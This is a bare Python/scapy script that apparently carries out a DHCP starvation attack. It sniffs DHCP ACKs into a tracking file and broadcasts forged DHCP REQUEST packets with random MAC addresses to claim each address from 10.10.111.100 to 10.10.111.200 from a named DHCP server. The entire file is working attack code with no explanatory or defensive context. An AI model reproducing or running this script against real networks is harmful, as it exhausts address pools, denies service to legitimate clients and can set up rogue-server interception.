import sys
from scapy.all import *
import threading 
import time
content = []
with open("ipadree.txt") as f:
	for line in f:
		#print(line)
		line = line.strip("\n")
		content.append(line)

class dhcpreader(threading.Thread):
	def run(self):
		print("starting sniffing")
		sniff(prn=checkDHCP)
		print("stopping listening")

def checkDHCP(pkt):
	try:	
		dhcp = pkt.getlayer(DHCP)
		ip = pkt.getlayer(IP) 
		b=dhcp.display
		if("message-type=ack" in str(dhcp.display)):
			print("found ack for ",ip.dst)
			fo = open("ipadree.txt","a")
			fo.write(ip.dst+"\n")  #write to file for keeping track
			fo.close()
	except:
		print("no dhcp")
thread1 = dhcpreader()
thread1.start()

for i in range(0,101):
	reqIp = "10.10.111."+str(100+i)
	if reqIp in content:
		print("pass")
	else:
		mac = RandMAC()
		packet = Ether(src=mac,dst="ff:ff:ff:ff:ff:ff") /IP(src="0.0.0.0",dst="255.255.255.255") / UDP(sport=68,dport=67)/ BOOTP(chaddr="abcdefghijkl")/DHCP(options=[("message-type","request"),("requested_addr",reqIp),("server_id","10.10.111.101")])
		sendp(packet)
		print("Requesting ip address ",reqIp)
		time.sleep(2)
